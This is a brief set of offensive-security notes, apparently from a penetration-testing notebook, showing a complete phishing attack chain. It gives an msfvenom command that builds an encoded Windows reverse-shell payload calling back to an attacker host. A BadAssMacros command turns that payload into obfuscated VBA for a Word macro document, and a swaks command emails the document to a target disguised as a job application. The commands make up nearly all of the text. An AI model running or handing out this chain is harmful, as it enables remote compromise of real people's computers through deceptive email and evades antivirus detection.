> Create shellcode:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -e x86/shikata_ga_nai -i 5 -f raw -o shellcode.txt
```

> Use the x86 version of BadAssMacros:

```
.\BadAssMacros.exe -i shellcode.txt -w doc -p no -s indirect -c 5 -o shellcode.vba
```

> Paste the VBA code into our macro and save as .docm and then send it via email if that vector is possible:

```
sudo swaks -t <target_email> --from <attacker_email> --attach @<file> --server <target_ip> --body @body.txt --header "Subject: Job Application" --suppress-data
```
